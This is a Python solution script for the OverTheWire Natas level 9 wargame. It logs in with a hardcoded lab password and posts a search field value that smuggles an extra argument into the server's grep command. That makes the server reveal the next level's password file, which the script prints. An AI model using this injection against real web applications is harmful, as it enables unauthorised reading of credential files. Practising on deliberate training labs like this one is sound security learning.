import requests
import re

username = "natas9"
password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"

url = "http://natas9.natas.labs.overthewire.org/"

session = requests.session()

response = session.post(url, data={ "needle" : ". /etc/natas_webpass/natas10", "submit":"submit"} ,auth=(username, password))
content = (response.text)

flag = re.findall("/etc/natas_webpass/natas10:(.*)", content)[0]
print(flag)


